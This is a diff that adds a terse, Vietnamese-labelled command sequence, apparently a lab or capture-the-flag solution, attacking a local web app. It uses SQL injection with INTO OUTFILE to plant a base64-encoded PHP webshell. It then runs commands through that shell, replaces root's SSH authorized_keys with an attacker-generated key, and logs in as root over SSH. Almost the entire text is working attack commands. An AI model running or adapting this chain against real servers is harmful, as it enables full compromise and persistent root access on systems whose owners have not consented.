@@ -1,0 +1,29 @@
+1. Gán URL 
+export BASE="http://localhost:3000"
+2. Xác nhận SQL  
+curl -s "$BASE/product?id=1'" | grep SQL 
+3. Thêm file php 
+curl -s -G "$BASE/product" --data-urlencode "id=-1 UNION SELECT FROM_BASE64('PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pg=='),'','','' INTO OUTFILE '/app/uploads/shell3.py.php'-- -"
+4. Test webshell 
+curl -s -X POST "$BASE/uploads/shell3.py.php" -d "cmd=id"
+5. Kiểm tra SUID 
+curl -s -X POST "$BASE/uploads/shell3.py.php" -d "cmd=/usr/bin/env id"
+6. Tạo key 
+ssh-keygen -t rsa -b 2048 -f ./lab_key -N ""
+EXPORT_B64=$(cat ./lab_key.pub | base64 -w 0)
+7. Đẩy key 
+curl -s -X POST "$BASE/uploads/shell3.py.php" \
+  -d "cmd=sh -c \"echo '$EXPORT_B64' | base64 -d > /tmp/k.pub\""
+8. Xem ghi đúng key vô tmp chưa 
+curl -s -X POST "$BASE/uploads/shell3.py.php" -d "cmd=cat /tmp/k.pub"
+9. Đẩy tmp vô root 
+curl -s -X POST "$BASE/uploads/shell3.py.php" -d "cmd=/usr/bin/env rm -f /root/.ssh/authorized_keys"
+
+curl -s -X POST "$BASE/uploads/shell3.py.php" -d "cmd=/usr/bin/env install -D -m 600 /tmp/k.pub /root/.ssh/authorized_keys"
+
+curl -s -X POST "$BASE/uploads/shell3.py.php" -d "cmd=/usr/bin/env cat /root/.ssh/authorized_keys"
+
+10. Kết nối thử ssh 
+
+ssh -i ./lab_key -p 2022 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@localhost
+
